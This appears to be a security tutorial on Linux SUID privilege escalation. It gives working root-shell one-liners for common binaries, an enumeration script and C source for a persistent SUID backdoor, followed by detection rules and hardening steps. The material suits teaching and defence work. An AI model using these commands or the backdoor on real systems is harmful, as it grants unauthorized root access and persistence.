---
title: "SUID Abuse — Escalating to Root with Forgotten Binaries"
date: 2025-01-14
description: "How misconfigured SUID binaries on Linux can be weaponized for privilege escalation using GTFOBins techniques and custom enumeration scripts."
category: privesc
os: [linux]
difficulty: medium
mitre_tactic: TA0004
mitre_technique: T1548.001
tags: [suid, linux, privesc, gtfobins, setuid, enumeration]
status: published
readingTime: 9
---

## What is SUID?

The **SUID (Set User ID)** bit is a special Linux permission that causes an executable to run with the **privileges of the file owner** rather than the user invoking it.

When a binary owned by `root` has the SUID bit set, any user who executes it gains temporary root-level access for the duration of that process. This is by design for binaries like `/usr/bin/passwd` — but becomes a critical attack vector when found on unexpected binaries.

```bash
# Permission example — the 's' in owner execute position = SUID set
-rwsr-xr-x 1 root root 67816 Jan  5 12:00 /usr/bin/passwd
```

> **MITRE ATT&CK:** This technique maps to [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) under the Privilege Escalation tactic (TA0004).

---

## Step 1 — Enumerate SUID Binaries

The first step is finding all SUID-enabled binaries on the system.

```bash
# Find all SUID binaries (suppress permission-denied errors)
find / -perm -u=s -type f 2>/dev/null

# Limit search to common binary paths for speed
find /usr /bin /sbin /opt /home -perm -u=s -type f 2>/dev/null

# Also check SGID binaries (runs as group owner)
find / -perm -g=s -type f 2>/dev/null
```

A clean system will return a predictable, short list. Look for anything **unusual** — non-standard paths, custom scripts, or development tools.

---

## Step 2 — Cross-Reference with GTFOBins

[GTFOBins](https://gtfobins.github.io/) is the authoritative reference for Unix binaries that can be abused when they have elevated permissions.

### find

```bash
# Verify SUID is set
ls -la $(which find)
# -rwsr-xr-x 1 root root 204112 ... /usr/bin/find

# Exploitation — spawns root shell
find . -exec /bin/sh -p \; -quit

# Verify escalation
whoami
# root
```

The `-p` flag is critical — it tells `sh` to **preserve the effective UID** rather than dropping it.

### vim / vi

```bash
# Check
ls -la $(which vim)

# Method 1: via Python3 extension
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Method 2: direct shell spawn
vim -c ':!sh -p'

# Method 3: via shell escape in normal mode (inside vim)
# :set shell=/bin/sh
# :shell
```

### python / python3

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Also works with older python2
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### bash

```bash
# Only exploitable if SUID is on bash itself (rare but happens on CTFs)
ls -la /bin/bash
# -rwsr-xr-x 1 root root ...

bash -p
# bash-5.1# whoami
# root
```

### nmap (legacy versions < 5.35)

```bash
# Interactive mode available on old nmap versions
nmap --interactive
nmap> !sh
```

### tar

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### perl

```bash
perl -e 'exec "/bin/sh";'
```

### awk

```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

### less / more

```bash
# Inside less/more pager
less /etc/passwd
# Then type:
!/bin/sh
```

---

## Step 3 — Automated Enumeration Script

The following script cross-references discovered SUID binaries with a known-exploitable list and outputs prioritized targets.

```bash
#!/usr/bin/env bash
# suid_hunter.sh — SUID enumeration and triage
# Usage: ./suid_hunter.sh
# Author: r3d/ops | KBM Security

RED='\033[0;31m'
YEL='\033[0;33m'
GRN='\033[0;32m'
BLU='\033[0;34m'
RST='\033[0m'

KNOWN_EXPLOITABLE="nmap|vim|vi|find|python|python3|bash|perl|ruby|tar|wget|curl"
KNOWN_EXPLOITABLE+="|nc|netcat|awk|less|more|man|ftp|gdb|strace|ltrace|tclsh"
KNOWN_EXPLOITABLE+="|env|expect|lua|php|ruby|node|git|zip|unzip|7z|aria2c"

echo -e "${BLU}[*] SUID Binary Hunter — r3d/ops${RST}"
echo -e "${BLU}[*] Scanning filesystem...${RST}\n"

BINS=$(find / -perm -u=s -type f 2>/dev/null)
TOTAL=$(echo "$BINS" | wc -l)

echo -e "[*] Found ${YEL}${TOTAL}${RST} SUID binaries\n"
echo -e "[*] Checking against known exploitable list...\n"

HIT=0
while IFS= read -r bin; do
  name=$(basename "$bin")
  owner=$(stat -c '%U' "$bin" 2>/dev/null)
  perms=$(stat -c '%A' "$bin" 2>/dev/null)

  if echo "$name" | grep -qiE "$KNOWN_EXPLOITABLE"; then
    echo -e "  ${RED}[!!!] EXPLOITABLE:${RST} $bin"
    echo -e "       Owner: ${YEL}${owner}${RST} | Perms: ${perms}"
    echo -e "       GTFOBins: ${BLU}https://gtfobins.github.io/gtfobins/${name}/#suid${RST}\n"
    HIT=$((HIT + 1))
  else
    echo -e "  ${GRN}[ok]${RST}  $bin  ${BLU}(${owner})${RST}"
  fi
done <<< "$BINS"

echo -e "\n[*] Summary: ${RED}${HIT} potential target(s)${RST} out of ${TOTAL} total SUID binaries"
```

---

## Step 4 — Writing a Custom SUID Backdoor (Lab Scenario)

In authorized red team engagements, you may need to plant a persistent SUID shell for post-exploitation access.

```bash
# As root — compile a minimal setuid shell wrapper
cat > /tmp/rootshell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF

# Compile and set SUID
gcc /tmp/rootshell.c -o /tmp/rootshell
chmod u+s /tmp/rootshell

# Low-privilege user can now call it
/tmp/rootshell
# bash-5.1# whoami
# root
```

> **DANGER:** Never deploy SUID backdoors on production systems or without explicit written authorization. This is for authorized lab environments only.

---

## Detection & Mitigation

### Blue Team Detections

| Indicator | Data Source | Rule Logic |
|-----------|-------------|------------|
| New SUID binary created | auditd / inotify | `find / -newer /tmp -perm -4000` |
| SUID binary executes shell | auditd execve | parent=suid_binary, child=/bin/sh |
| Unexpected SUID owner | file integrity | owner=root AND path NOT IN baseline |
| `-p` flag passed to shell | process args | `sh -p` OR `bash -p` in cmdline |

### Hardening Commands

```bash
# Audit all SUID binaries — save baseline
find / -perm -4000 -type f 2>/dev/null > /root/suid_baseline.txt

# Remove SUID from a specific binary
chmod u-s /path/to/binary

# Mount partitions with nosuid to prevent SUID on those filesystems
# In /etc/fstab:
# /dev/sdb1 /data ext4 defaults,nosuid,noexec 0 0

# AppArmor profile enforcement
aa-enforce /usr/bin/find

# Verify binary integrity against package manager
dpkg --verify    # Debian/Ubuntu
rpm -Va          # RHEL/CentOS
```

### Recommended Monitoring Rules (auditd)

```bash
# /etc/audit/rules.d/suid.rules

# Monitor SUID binary execution
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k suid_exec

# Monitor chmod/chown changing SUID bit
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F a1=04755 -k suid_create
```

---

## Lab Setup

To practice these techniques safely, spin up a vulnerable VM:

```bash
# Vagrant — intentionally vulnerable Linux box
vagrant init bento/ubuntu-22.04
vagrant up
vagrant ssh

# Manually set up a vulnerable binary for practice
sudo chmod u+s /usr/bin/find
find . -exec /bin/sh -p \; -quit
```

Alternatively, use dedicated platforms:
- **HackTheBox** — Linux privilege escalation machines
- **TryHackMe** — "Linux PrivEsc" room
- **VulnHub** — Kioptrix, Mr. Robot series

---

## Summary

| Binary | Exploit Method | Difficulty |
|--------|---------------|------------|
| `find` | `-exec /bin/sh -p` | Easy |
| `python3` | `os.execl("/bin/sh","sh","-p")` | Easy |
| `vim` | `:!sh -p` | Easy |
| `bash` | `bash -p` | Easy |
| `tar` | `--checkpoint-action=exec` | Medium |
| `nmap` | `--interactive` (legacy) | Medium |
| `awk` | `system("/bin/sh")` | Easy |

The key takeaway: **any** binary with SUID set that allows arbitrary code execution or shell spawning is a path to root. Always enumerate SUID binaries as part of your Linux privilege escalation checklist.